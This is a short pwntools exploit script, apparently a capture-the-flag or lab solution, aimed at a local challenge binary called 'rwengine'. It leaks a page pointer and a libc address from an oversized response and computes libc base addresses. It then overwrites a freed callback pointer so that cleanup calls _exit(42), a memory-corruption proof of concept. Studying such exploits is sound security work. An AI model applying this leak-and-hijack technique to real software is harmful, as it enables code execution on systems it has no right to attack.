from pwn import *
import struct

io = process(['./ld-linux-x86-64.so.2', '--library-path', '.', './rwengine'])

def send_pkt(cmd, data=b""):
    length = len(data)
    header = struct.pack(">BH", cmd, length)
    io.send(header + data)

def recv_pkt():
    res_hdr = io.recvn(3)
    status, length = struct.unpack(">BH", res_hdr)
    resp = b""
    if length > 0:
        resp = io.recvn(length)
    return status, resp

send_pkt(0x10, b" " * 200)
status, resp = recv_pkt()
page_ptr = u64(resp[543:551])
toupper_addr = u64(resp[551:559])

libc = ELF("./libc.so.6")
libc_base = toupper_addr - libc.symbols['toupper']
exit_addr = libc_base + libc.symbols['_exit']

print(f"page_ptr = {hex(page_ptr)}")
print(f"libc_base = {hex(libc_base)}")
print(f"exit_addr = {hex(exit_addr)}")

send_pkt(0x12, struct.pack(">H", 0x100))
status, resp = recv_pkt()
chunk0_idx = struct.unpack(">H", resp)[0]

send_pkt(0x15)
status, resp = recv_pkt()

# Overwrite callback with _exit(42)
payload = p64(0) + p64(exit_addr) + p64(42)
send_pkt(0x10, payload)
status, resp = recv_pkt()

# Trigger cleanup
send_pkt(0x16)

io.wait()
print(f"Process exit code: {io.poll()}")
